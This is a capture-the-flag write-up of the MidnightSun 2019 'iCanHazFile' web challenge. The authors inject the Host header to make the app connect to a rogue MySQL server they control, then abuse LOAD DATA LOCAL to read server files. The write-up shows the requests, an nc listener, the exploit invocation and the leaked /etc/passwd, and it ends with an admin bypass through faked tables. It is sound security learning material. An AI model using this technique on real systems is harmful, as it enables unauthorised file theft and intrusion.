# MidnightSun CTF 2019 Finals 
## iCanHazFile - 1003 points

Author: @avlidienbrunn
Category: web pwned!
Solves: 6
Second Blood!

### Description

I forgot my login to this health care system. The swedish cough is the worst...
settings Service: http://icanhazfile-01.play.midnightsunctf.se:3002/

### Analysis

In the next challenge we find a Login panel. It only recognizes admin as a valid
user.

Analyzing the web we realize that changing the host header gives an error
connection to the database:

```
GET /login HTTP/1.1
Host: icanhazfile-01.play.midnightsunctf.se:3002
```

```
GET /login HTTP/1.1
Host: 163.172.175.139

/app/app.py: could not connect to database
```

We open a port in 3306 to see if we receive any connection and see that does not
connect, with Burp Collaborator we see that receives a DNS request, with the
subdomain: database.ip.com, create a subdomain and raise the port with nc.

```
GET /login HTTP/1.1
Host: borjmz.com
```

```
root@midnightsun:~# nc -lvp 3306
listening on [any] 3306 
connect to [10.64.180.121] from ... [52.208.15.104] 36136
```

What we're trying to do is set up a MySQL server to see if it gives us back
information about the tables or something useful to continue with the
exploitation, seeing that we don't receive the data we need, we think about
other options, we find a writeup of the CTF Volga2018
(https://github.com/balsn/ctf_writeup/tree/master/20180324-volgactf)
where the same bug is exploited.

http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/

We put a tcpdump to the listening and we receive the connection of the SQL:

```.... .... 1... .... = Can Use LOAD DATA LOCAL: Set

Client Capabilities: 0xa285
.... .... .... ...1 = Long Password: Set
.... .... .... ..0. = Found Rows: Not set
.... .... .... .1.. = Long Column Flags: Set
.... .... .... 0... = Connect With Database: Not set
.... .... ...0 .... = Don't Allow database.table.column: Not set
.... .... ..0. .... = Can use compression protocol: Not set
.... .... .0.. .... = ODBC Client: Not set
.... .... 1... .... = Can Use LOAD DATA LOCAL: Set
.... ...0 .... .... = Ignore Spaces before '(': Not set
.... ..1. .... .... = Speaks 4.1 protocol (new flag): Set
.... .0.. .... .... = Interactive Client: Not set
.... 0... .... .... = Switch to SSL after handshake: Not set
...0 .... .... .... = Ignore sigpipes: Not set
..1. .... .... .... = Knows about transactions: Set
.0.. .... .... .... = Speaks 4.1 protocol (old flag): Not set
1... .... .... .... = Can do 4.1 authentication: Set
```
### Exploitation

We tested the balsn exploit and made some modifications.

```
root@midnightsun:~# python3 mysql_exploit.py /etc/passwd```
```[+] Trying to bind to 0.0.0.0 on port 3306: Done```
```[+] Waiting for connections on 0.0.0.0:3306: Got connection from * on port 36150```

```b'\xb7\x00\x00\x01\x85\xa2\xbf\x01\x00\x00\x00\x01\x08\x00\x00\x00\x00\x00\x00```
```\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00root\x00\x14```
```\xc9!~\xc8\xd1t\xf3B\x17\x0c:\x99\x08\x89\x8f\xaf\x8a\xc3l?mysql_native_password```
```\x00f\x03_os\x05Linux\x0c_client_name\x08libmysql\x04_pid\x0525131\x0f```
```_client_version\x065.7.26\t_platform\x06x86_64\x0cprogram_name\x05mysql'```
```b'!\x00\x00\x00\x03select @@version_comment limit 1'```
```b'\xd7\x04\x00\x02```
```root:x:0:0:root:/root:/bin/bash\n```
```daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n```
```bin:x:2:2:bin:/bin:/usr/sbin/nologin\n```
```sys:x:3:3:sys:/dev:/usr/sbin/nologin\n```
```sync:x:4:65534:sync:/bin:/bin/sync\n```
```games:x:5:60:games:/usr/games:/usr/sbin/nologin\```
```nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n```
```lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n```
```mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n```
```news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n```
```uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n```
```proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n```
```www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n```
```backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n```
```list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n```
```irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\n```
```gnats:x:41:41:Gnats :/var/lib/gnats:/usr/sbin/nologin\n```
```nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n```
```systemd-timesync:x:100:102:,,,:/run/systemd:/bin/false\n```
```systemd-network:x:101:103::/run/systemd/netif:/bin/false\n```
```systemd-resolve:x:102:104::/run/systemd/resolve:/bin/false\n```
```systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false\n```
```_apt:x:104:65534::/nonexistent:/bin/false\n\x00\x00\x00\x03'

[*] Closed connection to 52.208.15.104 port 36150
```

We receive the output of /etc/password, read /app/app.py to get the source code
of the web, we try to read the typical files of the system to get more
information and so it seems we are inside a chroot, after trying several files
without success we go back to the source code of the app and see the next line:

```
def database(host):
 host = shellquote(host)
 password = os.getenv('MYSQL_ROOT_PASSWORD')
 nonce = '.join(random.choice(string.ascii_lowercase) for i in range(10))
 cmd = "timeout 1 mysql -uroot -p"+password+" -h"+host+" -e
 'SELECT \""+nonce+"\" AS nonce, name, password from flag.users limit 1'" 
```

We set up a MySQL server with the necessary tables to bypass the admin and get
the flag.


Many thanks to all the [ID-10-T](https://twitter.com/id10t_ctf) team and especially to Uri, Javi, HansTopo and
Alfredo. Also to [@HackingForSoju](https://twitter.com/hackingforsoju) the organizers of the challenges

Challenge resolved by [Borjmz](https://twitter.com/qm9yamfn) and [HansTopo](https://twitter.com/_dreadlocked)

Borja
